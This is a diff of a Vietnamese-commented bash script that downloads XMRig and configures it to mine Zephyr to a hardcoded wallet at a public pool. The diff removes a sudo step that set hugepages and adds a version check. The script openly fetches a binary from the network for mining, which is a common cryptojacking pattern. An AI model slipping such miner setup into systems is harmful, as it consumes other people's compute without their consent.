@@ -1,10 +1,5 @@
 #!/bin/bash
 
-# Cập nhật gói và cài đặt sysctl cho vm.nr_hugepages
-sudo apt-get update
-sudo sysctl -w vm.nr_hugepages=1280
-sudo bash -c "echo vm.nr_hugepages=1280 >> /etc/sysctl.conf"
-
 # Định nghĩa các biến cần thiết
 VERSION=$(curl -s https://api.github.com/repos/xmrig/xmrig/releases/latest | grep "tag_name" | awk '{print substr($2, 2, length($2)-3)}')
 azure=mxsemsdnlkdj
@@ -13,6 +8,11 @@ POOL=ca-zephyr.miningocean.org:5432
 USERNAME=ZEPHsAMyUCyAY1HthizFxwSyZhMXhpomE7VAsn6wyuVRLDhxBNTjMAoZdHc8j2yjXoScPumfZNjGePHVwVujQiZHjJangKYWriB
 ALGO=rx/0
 DONATE=1
+
+if [ -z "$VERSION" ]; then
+  echo "Error: Unable to fetch XMRig version."
+  exit 1
+fi
 
 # Tải xuống và giải nén XMRig
 wget https://github.com/xmrig/xmrig/releases/download/v$VERSION/xmrig-$VERSION-linux-x64.tar.gz
